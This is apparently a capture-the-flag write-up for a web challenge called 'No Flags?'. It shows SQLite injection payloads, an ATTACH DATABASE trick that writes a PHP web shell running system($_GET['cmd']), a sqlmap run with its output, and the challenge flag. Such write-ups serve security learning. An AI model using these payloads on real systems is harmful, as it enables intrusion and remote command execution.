# No Flags?

![](Pasted%20image%2020220502175546.png)

## Solution

### Looking at `index.php`

The `flag` parameter is injectable, can add SQL Statements to it.
You can display custom output through the list of flags.

The SQL Version is sqlite, For example, you can check the SQL version like this

```
'); INSERT INTO Flags VALUES ((SELECT sqlite_version()));-- -
```

![](Pasted%20image%2020220502175624.png)

The version is 3.34.1

The database is generated per session, so nothing to look there.

On looking more into SQLite Injection, I found out you can write to files, however, testing with the `/var/www/html` directory fails. (Can check the dockerfile)

Link used is https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

## Looking at `Dockerfile`

The executable we want to run is `/printflag`, and we can write to `/var/www/html/abyss` (since that directory is [chmod 333|https://chmodcommand.com/chmod-333/]). Hence, we can write a webshell and run custom code.

I ran this SQL Injection

```
'); ATTACH DATABASE '/var/www/html/abyss/index.php' AS lol;CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

Afterwards I ran 

![](Pasted%20image%2020220502175944.png)

Remember to delete `index.php` once done

## Flag

`actf{why_do_people_still_use_php}`

## SQLMap

```bash
sudo docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url "https://no-flags.web.actf.co/" --forms --crawl=2 --level=3 --risk=2
```

```bash
[10:05:29] [WARNING] User-Agent parameter 'User-Agent' is not injectable
sqlmap identified the following injection point(s) with a total of 2276 HTTP(s) requests:
---
Parameter: flag (POST)
    Type: stacked queries
    Title: SQLite > 2.0 stacked queries (heavy query - comment)
    Payload: flag=zXEu');SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: flag=zXEu') UNION ALL SELECT 'qkjvq'||'uIYjPSVhwuuJGAAHaEaPqDLMraZuThPTLRwDFEeM'||'qpvpq'-- ByZO
---
do you want to exploit this SQL injection? [Y/n] y
[12:31:19] [INFO] the back-end DBMS is SQLite
web application technology: PHP 8.1.5
back-end DBMS: SQLite
[12:31:19] [WARNING] HTTP error codes detected during run:
502 (Bad Gateway) - 2 times
[12:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05022022_0857am.csv'

[*] shutting down at 12:31:19

(base) [hacker@hackerbook ~]$ 
```